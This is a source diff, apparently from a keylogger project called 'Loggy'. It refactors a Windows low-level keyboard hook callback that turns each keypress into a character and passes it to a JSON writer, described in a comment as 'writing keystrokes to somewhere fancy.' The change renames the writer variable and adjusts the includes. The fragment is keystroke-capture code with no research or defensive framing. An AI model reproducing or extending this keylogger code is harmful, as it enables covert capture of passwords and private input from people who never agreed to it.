@@ -1,14 +1,15 @@
 #include "../include/core.h"
+#include "../include/externals.h"
 #include <cstdio>
-#include <iostream>
+
+// Used to handle writing keystrokes to somewhere fancy.
+Loggy::JsonWriter *loggyWriter = new Loggy::JsonWriter(operatingSystem);
 
 // Hook handler.
 HHOOK hook;
 
 // Contains data received by hook callback.
 KBDLLHOOKSTRUCT kbdStruct;
-
-Loggy::JsonWriter *writer = new Loggy::JsonWriter(operatingSystem);
 
 LRESULT CALLBACK VKeyCodeCb(int code, WPARAM wParam, LPARAM lParam) {
     if (code >= 0)
@@ -19,7 +20,7 @@ LRESULT CALLBACK VKeyCodeCb(int code, WPARAM wParam, LPARAM lParam) {
             // a key (non-system) is pressed.
             kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
             char vkChar = MapVirtualKey(kbdStruct.vkCode, MAPVK_VK_TO_CHAR);
-            writer->Write(vkChar, kbdStruct.vkCode);
+            loggyWriter->Write(vkChar, kbdStruct.vkCode);
         }
     }
 
